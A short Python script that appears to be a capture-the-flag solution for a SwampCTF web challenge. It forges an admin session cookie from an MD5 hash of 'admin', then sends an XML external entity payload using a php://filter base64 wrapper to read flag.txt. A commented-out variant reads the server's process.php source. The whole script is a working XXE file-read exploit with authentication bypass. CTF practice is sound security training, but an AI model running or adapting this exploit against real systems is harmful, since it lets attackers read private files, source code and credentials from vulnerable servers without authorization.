import requests as r 
import base64
import hashlib 

url = "http://chals.swampctf.com:40043"

user = "admin"
headers = {
    "Cookie": f"user={hashlib.md5(user.encode()).hexdigest()}",
}

def submit_process(xml):
    data = {
        "submitdata": xml
    }
    resp = r.post(f"{url}/process.php", headers=headers, data=data)
    content = resp.text.split("SEP")
    print(base64.b64decode(content[1]).decode())


# xml =  '<?xml version="1.0" encoding="UTf-8" ?><!DOCTYPE name [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=process.php">]><root><name>SEP&xxe;SEP</name><email>test@swamptech.com</email></root>'
xml =  '<?xml version="1.0" encoding="UTf-8" ?><!DOCTYPE name [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.txt">]><root><name>SEP&xxe;SEP</name><email>test@swamptech.com</email></root>'

submit_process(xml)

